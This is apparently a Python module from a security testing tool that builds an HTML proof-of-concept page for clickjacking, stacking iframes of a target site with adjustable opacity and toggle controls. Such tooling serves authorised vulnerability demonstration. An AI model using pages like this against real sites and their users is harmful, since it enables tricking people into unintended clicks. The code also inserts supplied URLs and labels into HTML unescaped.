import re
from urllib.parse import urlparse


class ClickbanditService:
    def generate_poc(self, target_url: str, layers: list[dict], config: dict) -> str:
        opacity_cycle = [0.1, 0.5, 1.0]
        layers_html = ""
        for i, layer in enumerate(layers):
            url = layer.get("url", "")
            opacity = layer.get("opacity", 1.0)
            pos = layer.get("position", {})
            size = layer.get("size", {})
            label = layer.get("label", f"Layer {i + 1}")
            x = pos.get("x", 0)
            y = pos.get("y", 0)
            w = size.get("width", 300)
            h = size.get("height", 200)

            layers_html += f"""
    <div class="layer" id="layer-{i}" style="position:absolute;left:{x}px;top:{y}px;width:{w}px;height:{h}px;opacity:{opacity};z-index:{i + 1}">
        <iframe src="{url}" width="{w}" height="{h}" style="border:2px solid #888;border-radius:4px"></iframe>
        <div class="layer-label">{label}</div>
    </div>"""

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Nyx Clickbandit POC - {target_url}</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ font-family:'Segoe UI',Tahoma,sans-serif; background:#1a1a2e; color:#e0e0e0; }}
.banner {{ background:#16213e; padding:12px 20px; display:flex; align-items:center; justify-content:space-between; border-bottom:2px solid #0f3460; }}
.banner h1 {{ font-size:16px; color:#e94560; }}
.banner .controls {{ display:flex; gap:8px; }}
.banner button {{ background:#0f3460; color:#e0e0e0; border:none; padding:6px 14px; border-radius:4px; cursor:pointer; font-size:12px; }}
.banner button:hover {{ background:#533483; }}
.instructions {{ padding:12px 20px; background:#1a1a2e; font-size:12px; color:#aaa; border-bottom:1px solid #16213e; }}
.preview {{ position:relative; width:100%; min-height:600px; overflow:auto; padding:20px; }}
.layer-label {{ position:absolute; top:-18px; left:4px; font-size:10px; color:#e94560; background:rgba(22,33,62,0.85); padding:1px 6px; border-radius:3px; white-space:nowrap; }}
.layer:hover {{ outline:2px dashed #e94560; }}
</style>
</head>
<body>
<div class="banner">
    <h1>Nyx Clickbandit POC</h1>
    <div class="controls">
        <button id="toggleOpacity">Toggle Opacity</button>
        <button id="toggleAll">Show/Hide All</button>
    </div>
</div>
<div class="instructions">
    <strong>Target:</strong> {target_url} &mdash; Proof-of-Concept for clickjacking vulnerability.
    Use "Toggle Opacity" to cycle between 0.1, 0.5, and 1.0 opacity.
    Use "Show/Hide All" to toggle visibility of all layers.
</div>
<div class="preview" id="preview">
{layers_html}
</div>
<script>
(function() {{
    var opacityIndex = 1;
    var visible = true;
    var opacityValues = [0.1, 0.5, 1.0];
    var layers = document.querySelectorAll('.layer');

    document.getElementById('toggleOpacity').addEventListener('click', function() {{
        opacityIndex = (opacityIndex + 1) % opacityValues.length;
        var val = opacityValues[opacityIndex];
        layers.forEach(function(l) {{ l.style.opacity = val; }});
    }});

    document.getElementById('toggleAll').addEventListener('click', function() {{
        visible = !visible;
        var val = visible ? '' : 'none';
        layers.forEach(function(l) {{ l.style.display = val; }});
    }});
}})();
</script>
</body>
</html>"""
        return html

    def validate_url(self, url: str) -> bool:
        try:
            parsed = urlparse(url)
            return parsed.scheme in ("http", "https") and bool(parsed.netloc)
        except Exception:
            return False
